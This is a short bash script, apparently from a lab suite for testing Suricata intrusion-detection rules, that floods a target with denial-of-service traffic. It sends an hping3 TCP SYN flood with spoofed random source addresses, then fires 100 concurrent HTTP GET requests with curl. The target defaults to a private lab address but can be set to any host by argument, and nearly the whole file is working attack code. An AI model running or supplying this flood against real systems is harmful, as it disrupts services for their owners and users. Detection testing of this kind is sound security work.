#!/bin/bash
# =============================================================================
# dos_attack.sh - Denial of Service Attack Suite (PFA)
# =============================================================================
# Maps to Suricata rules: sid:1000060 (TCP SYN flood), sid:1000061 (ICMP flood)
# =============================================================================
TARGET="${1:-10.0.1.10}"
PORT="${2:-80}"
LOG_DIR="/opt/pfa/attacks/logs"
mkdir -p "$LOG_DIR"
REPORT="$LOG_DIR/dos_$(date +%Y%m%d_%H%M%S).log"

echo "[*] PFA DoS Attack Suite" | tee "$REPORT"
echo "[*] Target: $TARGET:$PORT" | tee -a "$REPORT"
echo "[*] Time: $(date -u)" | tee -a "$REPORT"
echo "[*] WARNING: Using low rate for lab environment" | tee -a "$REPORT"
echo "" | tee -a "$REPORT"

# Phase 1: TCP SYN flood (triggers sid:1000060)
echo "[*] Phase 1: TCP SYN Flood (hping3)" | tee -a "$REPORT"
echo "[*] Sending 500 SYN packets..." | tee -a "$REPORT"
hping3 -S -p "$PORT" --flood --rand-source -c 500 "$TARGET" 2>&1 | tee -a "$REPORT"

# Phase 2: HTTP GET flood
echo "" | tee -a "$REPORT"
echo "[*] Phase 2: HTTP GET Flood" | tee -a "$REPORT"
for i in $(seq 1 100); do
    curl -s "http://$TARGET:$PORT/" >/dev/null 2>&1 &
done
wait
echo "[*] Sent 100 concurrent HTTP requests" | tee -a "$REPORT"

echo "" | tee -a "$REPORT"
echo "[*] DoS attack complete. Report: $REPORT" | tee -a "$REPORT"
